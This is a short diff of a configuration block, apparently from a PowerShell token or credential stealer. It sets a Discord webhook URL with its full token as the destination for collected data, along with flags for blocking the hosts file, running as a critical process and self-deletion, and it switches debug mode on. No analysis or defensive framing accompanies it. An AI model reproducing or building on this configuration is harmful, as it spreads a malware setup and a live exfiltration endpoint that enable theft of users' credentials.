@@ -1,5 +1,5 @@
 $webhook = "https://discord.com/api/webhooks/1243306387090571385/HBUa-m0nJNWj49G1spdMRIExaYTMulmz8so1TJXNJ4oGNUl3tK78e3r3jpiBgpuQ9VjX" 
-$debug = $false
+$debug = $true
 $blockhostsfile = $true
 $criticalprocess = $true
 $melt = $false
